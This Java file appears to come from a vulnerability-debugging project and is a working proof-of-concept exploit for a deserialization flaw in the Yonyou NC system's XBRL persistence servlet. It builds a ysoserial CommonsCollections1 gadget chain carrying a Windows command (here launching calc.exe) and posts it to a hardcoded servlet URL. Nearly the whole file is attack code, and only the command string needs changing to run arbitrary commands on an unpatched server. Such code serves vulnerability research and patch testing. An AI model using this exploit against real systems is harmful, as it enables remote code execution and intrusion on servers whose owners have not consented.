package cve.nc;

import com.pacemrc.vuldebug.common.utils.basic.ObjectUtil;
import com.pacemrc.vuldebug.common.utils.http.HttpRequest;
import org.apache.http.client.methods.HttpPost;
import ysoserial.payloads.ObjectPayload;

/**
 * 漏洞：
 * NC系统的xbrl接口反序列化漏洞
 * https://security.yonyou.com/#/noticeInfo?id=428
 */
public class XbrlPersistenceServlet_RCE {

    public static void main(String[] args) throws Exception {

//        String url = "http://10.58.120.201/servlet/~uapxbr/uap.xbrl.persistenceImpl.XbrlPersistenceServlet";
        String url = "http://10.58.120.201/service/XbrlPersistenceServlet";
        String gadget = "CommonsCollections1";
        String cmd = "cmd.exe /c calc.exe";
        ObjectPayload<?> payload = (ObjectPayload) Class.forName("ysoserial.payloads." + gadget).newInstance();
        Object obj = payload.getObject(cmd);

        byte[] bytes = ObjectUtil.getByte(obj);

        HttpRequest httpRequest = new HttpRequest();
        HttpPost httpPost = new HttpPost(url);
        httpRequest.sendByteArrayPost(httpPost, bytes);
    }
}
